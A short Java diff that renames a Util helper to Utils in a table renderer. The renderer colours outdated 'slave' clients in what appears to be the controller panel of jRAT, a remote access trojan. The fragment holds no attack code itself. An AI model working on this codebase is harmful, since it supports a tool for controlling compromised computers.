@@ -17,7 +17,7 @@ import pro.jrat.common.Version;
 import pro.jrat.settings.Colors;
 import pro.jrat.ui.frames.Frame;
 import pro.jrat.utils.IconUtils;
-import pro.jrat.utils.Util;
+import pro.jrat.utils.Utils;
 
 
 @SuppressWarnings("serial")
@@ -35,7 +35,7 @@ public class MainTableRenderer extends DefaultTableCellRenderer {
 	public Component getTableCellRendererComponent(JTable table, Object value, boolean isSelected, boolean hasFocus, int row, int column) {
 		JLabel lbl = (JLabel) super.getTableCellRendererComponent(table, value, isSelected, hasFocus, row, column);
 
-		Slave slave = Util.getSlave(table.getValueAt(row, 3).toString());
+		Slave slave = Utils.getSlave(table.getValueAt(row, 3).toString());
 
 		if (slave != null && !isSelected && !slave.getVersion().equals(Version.getVersion()) && !slave.getVersion().equals("")) {
 			setForeground(Colors.getGlobal().getColorFromIndex(Colors.getGlobal().get("outdated servers").getIndex()));
